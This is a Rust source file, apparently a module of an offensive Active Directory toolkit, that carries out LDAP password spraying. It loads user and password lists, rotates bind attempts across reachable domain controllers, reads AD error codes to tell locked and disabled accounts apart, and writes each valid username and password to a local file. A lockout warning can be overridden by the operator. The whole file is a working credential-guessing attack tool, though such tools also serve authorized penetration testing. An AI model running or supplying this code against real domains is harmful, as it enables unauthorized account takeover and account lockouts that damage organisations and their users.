use crate::args::ProxyConfig;
use crate::args::SprayArgs;
use crate::help::add_terminal_spacing;
use crate::help::print_timestamp;
use chrono::Local;
use ldap3::LdapConn;
use std::error::Error;
use std::fs::File;
use std::io::{self, BufRead, Write};
use std::net::TcpStream;
use std::path::Path;
use std::thread;
use std::time::Duration;

pub struct SprayConfig {
    pub userfile: String,
    pub passwords: String,
    pub domain: String,
    pub dc_ip: Vec<String>, // Change from String to Vec<String>
    pub hash: Option<String>,
    pub timestamp_format: bool,
    pub proxy: Option<ProxyConfig>,
    pub threads: u32,
    pub jitter: u32,
    pub delay: u64,
    pub continue_on_success: bool,
    pub verbose: bool,
    pub lockout_threshold: u32, // New
    pub lockout_window_seconds: u32,
}

impl SprayConfig {
    pub fn from_args(args: &SprayArgs) -> Result<Self, Box<dyn Error>> {
        Ok(SprayConfig {
            userfile: args.userfile.clone(),
            passwords: args.password.clone(),
            domain: args.domain.clone(),
            dc_ip: args.dc_ip.clone(),
            hash: args.hash.clone(),
            timestamp_format: args.timestamp_format,
            proxy: args.proxy.clone(),
            threads: args.threads,
            jitter: args.jitter,
            delay: args.delay,
            continue_on_success: args.continue_on_success,
            verbose: args.verbose,
            lockout_threshold: args.lockout_threshold.unwrap_or(3), // Default: 3 attempts
            lockout_window_seconds: args.lockout_window_seconds.unwrap_or(300), // Default: 300 seconds
        })
    }
}

pub enum LoginResult {
    Success,
    InvalidCredentials,
    AccountLocked,
    AccountDisabled,
    Failed,
}

pub fn start_password_spray(config: SprayConfig) -> Result<(), Box<dyn Error>> {
    let lockout_threshold = config.lockout_threshold;
    let lockout_window_seconds = config.lockout_window_seconds;
    let mut invalid_attempts: std::collections::HashMap<String, (u32, std::time::Instant)> =
        std::collections::HashMap::new();
    let mut warned_users = std::collections::HashSet::new(); // Keep track of warned users

    add_terminal_spacing(1);
    println!("[*] Domain: {}", config.domain);

    // Filter reachable domain controllers
    println!("[*] Testing connectivity for Domain Controllers...");
    let reachable_dcs: Vec<String> = config
        .dc_ip
        .iter()
        .filter_map(|dc| {
            if let Ok(_) = check_ldap_port(dc, 389, Duration::from_secs(5)) {
                println!("[+] Successfully connected to {}", dc);
                Some(dc.clone())
            } else {
                println!("[-] Failed to connect to {}", dc);
                None
            }
        })
        .collect();

    if reachable_dcs.is_empty() {
        return Err("No reachable Domain Controllers.".into());
    }

    println!("[*] Reachable Domain Controllers: {:?}", reachable_dcs);

    let users = read_users(&config.userfile)?;
    let passwords = read_lines(&config.passwords)?;

    println!("[*] Loaded {} users", users.len());
    println!("[*] Loaded {} passwords", passwords.len());
    println!("[*] Lockout Threshold: {} attempts", lockout_threshold);
    println!("[*] Lockout Window: {} seconds\n", lockout_window_seconds);
    println!("[*] Starting password spray at {}\n", print_timestamp());

    let timestamp = Local::now().format("%Y%m%d_%H%M%S");
    let output_file = format!("found_credentials_{}.txt", timestamp);
    let mut found_creds: Option<File> = None;
    let mut valid_credentials_found = false;

    let mut dc_index = 0; // Index to rotate domain controllers

    for (password_index, password) in passwords.iter().enumerate() {
        println!(
            "\n[*] Testing password: '{}' ({}/{} passwords)",
            password,
            password_index + 1,
            passwords.len()
        );

        for user in &users {
            let current_dc = &reachable_dcs[dc_index];
            dc_index = (dc_index + 1) % reachable_dcs.len(); // Rotate DCs

            println!(
                "[*] Attempting login: {}@{} on {}",
                user, config.domain, current_dc
            );

            match try_login(
                &format!("ldap://{}", current_dc),
                user,
                password,
                &config.domain,
            ) {
                Ok(LoginResult::Success) => {
                    // Handle successful login
                    if found_creds.is_none() {
                        found_creds = Some(File::create(&output_file)?);
                    }

                    let success_msg = format!(
                        "[+] Valid credentials found!\n    Username: {}\n    Password: {}\n    Domain: {}\n    Server: {}\n",
                        user, password, config.domain, current_dc
                    );
                    println!("\x1b[32m{}\x1b[0m", success_msg.trim());

                    if let Some(file) = &mut found_creds {
                        file.write_all(success_msg.as_bytes())?;
                        file.flush()?;
                    }
                    valid_credentials_found = true;

                    if !config.continue_on_success {
                        println!("[*] Valid credentials found and continue_on_success is false. Stopping spray.");
                        return Ok(());
                    }
                }
                Ok(LoginResult::InvalidCredentials) => {
                    println!(
                        "[-] Failed login: {}@{} with password: {}",
                        user, config.domain, password
                    );

                    let entry = invalid_attempts
                        .entry(user.clone())
                        .or_insert((0, std::time::Instant::now()));
                    entry.0 += 1;

                    if entry.0 > lockout_threshold
                        && entry.1.elapsed().as_secs() <= lockout_window_seconds as u64
                        && !warned_users.contains(user)
                    {
                        println!(
                            "\x1b[33m[!] Warning: {} has reached the lockout threshold ({} attempts in {} seconds)\x1b[0m",
                            user, lockout_threshold, lockout_window_seconds
                        );
                        println!("[!] Do you want to continue spraying? (yes/no): ");

                        let mut response = String::new();
                        std::io::stdin().read_line(&mut response)?;
                        if matches!(response.trim().to_lowercase().as_str(), "no" | "n") {
                            println!("[*] Aborting spray as per user request.");
                            return Ok(());
                        } else {
                            println!("[*] Continuing spray...");
                            warned_users.insert(user.clone());
                        }
                    }

                    if entry.1.elapsed().as_secs() > lockout_window_seconds as u64 {
                        entry.0 = 1;
                        entry.1 = std::time::Instant::now();
                    }
                }
                Ok(LoginResult::AccountLocked) => {
                    println!(
                        "\x1b[31m[!] Account locked: {}@{}\x1b[0m",
                        user, config.domain
                    );
                }
                Ok(LoginResult::AccountDisabled) => {
                    println!(
                        "\x1b[31m[!] Account disabled: {}@{}\x1b[0m",
                        user, config.domain
                    );
                }
                Ok(LoginResult::Failed) => {
                    println!(
                        "\x1b[31m[!] Failed login due to unknown reasons: {}@{}\x1b[0m",
                        user, config.domain
                    );
                }
                Err(e) => {
                    eprintln!(
                        "\x1b[31m[!] Connection Error: {}@{} on {} - {}\x1b[0m",
                        user, config.domain, current_dc, e
                    );
                }
            }

            // Delay between attempts
            if config.delay > 0 {
                thread::sleep(Duration::from_secs(config.delay));
            }
        }
    }

    println!("\n[*] Password spray complete at {}\n", print_timestamp());
    if valid_credentials_found {
        println!(
            "[+] Valid credentials were found and saved to: {}",
            output_file
        );
    } else {
        println!("[-] No valid credentials were found");
    }

    Ok(())
}

fn try_login(
    ldap_url: &str,
    username: &str,
    password: &str,
    domain: &str,
) -> Result<LoginResult, Box<dyn Error>> {
    // Create LDAP connection
    let mut ldap = LdapConn::new(ldap_url)?;

    // Format the username with the domain (UPN format)
    let bind_dn = format!("{}@{}", username.trim(), domain);

    // Attempt a bind
    match ldap.simple_bind(&bind_dn, password) {
        Ok(result) => {
            match result.success() {
                Ok(_) => Ok(LoginResult::Success),             // Login succeeded
                Err(_) => Ok(LoginResult::InvalidCredentials), // Bind failed with invalid credentials
            }
        }
        Err(e) => {
            let error_string = e.to_string();

            if error_string.contains("data 52e") {
                // Invalid credentials
                Ok(LoginResult::InvalidCredentials)
            } else if error_string.contains("data 775") {
                // Account locked out
                Ok(LoginResult::AccountLocked)
            } else if error_string.contains("data 533") {
                // Account disabled
                Ok(LoginResult::AccountDisabled)
            } else {
                // Other errors, e.g., connection errors
                Err(Box::new(e))
            }
        }
    }
}

fn read_lines<P>(filename: P) -> io::Result<Vec<String>>
where
    P: AsRef<Path>,
{
    let file = File::open(filename)?;
    let lines = io::BufReader::new(file)
        .lines()
        .filter_map(|line| line.ok())
        .filter(|line| !line.trim().is_empty())
        .collect();
    Ok(lines)
}

fn read_users(user_input: &str) -> io::Result<Vec<String>> {
    // If the input looks like a file path, try to read it
    if Path::new(user_input).exists() {
        read_lines(user_input)
    } else {
        // If not a file, treat it as a direct username
        Ok(vec![user_input.to_string()])
    }
}

fn check_ldap_port(host: &str, port: u16, _timeout: Duration) -> Result<(), Box<dyn Error>> {
    match TcpStream::connect((host, port)) {
        Ok(_) => Ok(()),
        Err(e) => Err(Box::new(e)),
    }
}
